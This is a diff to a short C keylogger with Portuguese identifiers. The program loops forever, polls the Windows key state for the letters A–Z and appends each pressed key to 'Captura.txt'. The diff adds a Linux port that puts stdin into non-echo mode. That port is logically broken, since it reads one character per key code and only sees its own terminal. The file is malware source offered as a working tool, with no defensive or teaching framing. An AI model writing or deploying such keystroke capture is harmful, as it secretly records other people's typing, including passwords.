@@ -1,34 +1,66 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
+
+#ifdef _WIN32
+    #include <windows.h>
+#elif __linux__
+    #include <unistd.h>
+    #include <fcntl.h>
+    #include <termios.h>
+#endif
 
 int main(int argc, char const *argv[])
 {
-	system("cls");
+    system("clear"); // Limpar tela no Linux
 
-	argv=argv;
-	argc=argc;
+    argv = argv;
+    argc = argc;
 
-	int result;
-	int teclas;
+    int result;
+    int teclas;
     FILE *arquivo;
 
-    arquivo = fopen("Captura.txt","w");
+    arquivo = fopen("Captura.txt", "w");
 
-    while(1) 
+    while (1)
     {
-        for(teclas = 64; teclas <= 90; teclas++) 
+#ifdef _WIN32
+        Sleep(1);
+#elif __linux__
+        usleep(1000); // usleep em microssegundos (1 ms)
+#endif
+
+        for (teclas = 64; teclas <= 90; teclas++)
         {
-            Sleep(1);
+            result = 0;
 
+#ifdef _WIN32
             result = GetAsyncKeyState(teclas);
-
-            if(result == -32767) 
+#elif __linux__
+            struct termios oldt, newt;
+            int ch;
+            int oldf = fcntl(STDIN_FILENO, F_GETFL, 0);
+            fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK);
+            tcgetattr(STDIN_FILENO, &oldt);
+            newt = oldt;
+            newt.c_lflag &= ~ICANON;
+            newt.c_lflag &= ~ECHO;
+            tcsetattr(STDIN_FILENO, TCSANOW, &newt);
+            ch = getchar();
+            tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
+            fcntl(STDIN_FILENO, F_SETFL, oldf);
+            if (ch == teclas)
             {
-                fprintf(arquivo,"%c",teclas);
+                result = -32767;
+            }
+#endif
+
+            if (result == -32767)
+            {
+                fprintf(arquivo, "%c", teclas);
             }
         }
     }
-    
-	return 0;
+
+    return 0;
 }
